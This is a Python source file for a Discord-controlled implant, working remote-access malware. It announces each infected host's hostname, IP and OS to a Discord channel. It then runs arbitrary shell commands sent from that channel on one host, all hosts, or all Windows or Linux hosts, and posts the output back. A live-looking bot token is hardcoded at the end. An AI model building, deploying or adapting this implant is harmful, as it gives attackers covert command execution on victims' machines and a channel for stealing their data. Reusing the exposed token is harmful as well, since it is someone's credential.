import time
import uuid
import socket
import os
import discord
from discord.ext import commands
from subprocess import check_output

# constants
target_channel_name = "general"
max_msg_size = 2000
cmd_prefix = '>'

# setup bot
intents = discord.Intents.default()
intents.message_content = True
bot = commands.Bot(command_prefix=cmd_prefix, intents=intents)

# store instance of Implant
global implant

# keep track of stuff
class Implant:
	def __init__(self):
		self.channel = self.get_channel()
		self.uuid = self.get_uuid()
		self.id = self.uuid
		self.hostname = self.get_hostname()
		self.ip = self.get_ip()
		self.os = self.get_os()

	def get_channel(self):
		for guild in bot.guilds:
			for channel in guild.text_channels:
				if channel.name == target_channel_name:
					return bot.get_channel(channel.id)
	
	def get_uuid(self):
		return str(uuid.uuid1())[:8]
	
	def set_id(self, new_id):
		self.id = new_id

	def get_hostname(self):
		return run_cmd("hostname")
	
	def get_ip(self):
		return [l for l in ([ip for ip in socket.gethostbyname_ex(socket.gethostname())[2] if not ip.startswith("127.")][:1], [[(s.connect(('8.8.8.8', 53)), s.getsockname()[0], s.close()) for s in [socket.socket(socket.AF_INET, socket.SOCK_DGRAM)]][0][1]]) if l][0][0]

	def get_os(self):
		return "Windows" if os.name == 'nt' else "Linux"

# helper functions
def get_datetime():
	return time.strftime('[%Y-%m-%d %H:%M:%S]')

# this one is to console
def log_msg(msg):
	print(f'{get_datetime()} {msg}')

# these three are to the discord server
async def send_msg(ctx, msg):
	if len(msg) >= max_msg_size:
		await ctx.send(f'{msg[:max_msg_size]}')
		await send_msg(ctx, msg[max_msg_size:])
	else:
		await ctx.send(f'{msg}')

async def reply_thread(ctx, msg):
	thread = None
	try:
		thread = await ctx.message.create_thread(name=f'{ctx.message.author.name} {ctx.message.content}', auto_archive_duration=60)
	except:
		thread = await ctx.message.fetch_thread()

	if len(msg) >= max_msg_size:
		await thread.send(f'{msg[:max_msg_size]}')
		await reply_thread(ctx, msg[max_msg_size:])
	else:
		await thread.send(msg)

async def reply_thread_once(ctx, msg):
	thread = None
	try:
		thread = await ctx.message.create_thread(name=f'{ctx.message.author.name} {ctx.message.content}', auto_archive_duration=60)
	except:
		return

	await thread.send(msg)

def run_cmd(cmd):
	return check_output(cmd, shell=True).decode()

# bot land
# events
@bot.event
async def on_ready():
	log_msg(f'Logged in as {bot.user}')

	global implant
	implant = Implant()

	msg = ""
	msg += f'-----------------[NEW SESSION]-----------------\n'
	msg += f'| ID: `{implant.id}`\n'
	msg += f'| Hostname: `{implant.hostname}`'
	msg += f'| IP: `{implant.ip}`\n'
	msg += f'| OS: `{implant.os}`\n'
	msg += f'--------------------------------------------------'
	await implant.channel.send(msg)

@bot.event
async def on_message(message):
	if message.author == bot.user:
		return

	log_msg(f'The message\'s content was {message.content}')
	await bot.process_commands(message)

# bot commands
@bot.command()
async def ping(ctx):
	'''
	Get the latency of the bot
	'''

	latency = bot.latency  # Included in the Discord.py library
	# Send it to the user
	await reply_thread_once(ctx, f'Current latency: {latency}s')

# helpers for cmd
# actually run the command
async def _cmd(ctx, arg):
	log_msg(f'{implant.id} Command recieved: {arg}')
	await reply_thread(ctx, f'ID: `{implant.id}` Command recieved: `{arg}`\n\nOutput: ```{run_cmd(arg)}```')

# individual
async def i_cmd(ctx, arg):
	imp_id = arg[:arg.index(" ")]
	if not imp_id == implant.id:
		return

	arg = arg[(arg.index(" ")+1):]

	await _cmd(ctx, arg)

# all
async def a_cmd(ctx, arg):
	await _cmd(ctx, arg)

# windows
async def w_cmd(ctx, arg):
	if not implant.os == 'Windows':
		return
	await _cmd(ctx, arg)

# linux
async def l_cmd(ctx, arg):
	if not implant.os == 'Linux':
		return
	await _cmd(ctx, arg)

# process commands
@bot.command(rest_is_raw=True)
async def cmd(ctx, *, arg):
	'''
	Run a command on a/multiple implants

	>cmd -i [implant_id] [command]
		specific implant
	>cmd -a [command]
		all implants
	>cmd -w [command]
		windows implants
	>cmd -l [command]
		linux implants
	'''
	
	arg = arg[1::]

	log_msg(f'Command recieved: {arg}')

	flag = arg[:2]
	log_msg(f'Flag: {flag}')

	match flag:
		case "-i":
			await i_cmd(ctx, arg[3:])
		case "-a":
			await a_cmd(ctx, arg[3:])
		case "-w":
			await w_cmd(ctx, arg[3:])
		case "-l":
			await l_cmd(ctx, arg[3:])
		case _:
			await reply_thread_once(ctx, f'Unknown flag `{flag}` received, please try again.')

	log_msg(f'Finished processing command: {arg}')

@bot.command()
async def change_id(ctx, arg1, arg2):
	'''
	Change the ID of an implant
	'''

	if not arg1 == implant.id:
		return
	log_msg(f'Changing implant id from {implant.id} to {arg2}')
	await reply_thread_once(ctx, f'Changing implant `{implant.id}` id to `{arg2}`')
	implant.set_id(arg2)

@bot.command()
async def sessions(ctx):
	'''
	List the active sessions
	'''

	await reply_thread(ctx, f'ID: `{implant.id}` | HN: `{implant.hostname}` | IP: `{implant.ip}` | OS: `{implant.os[0]}`')

bot.run("MTI3NTgyNTA2MTM3ODY1ODM2Nw.G1e8mP.3hhbRTZ6dpz8oefx5bxB9MOtBbA4KB2a6-TBHs")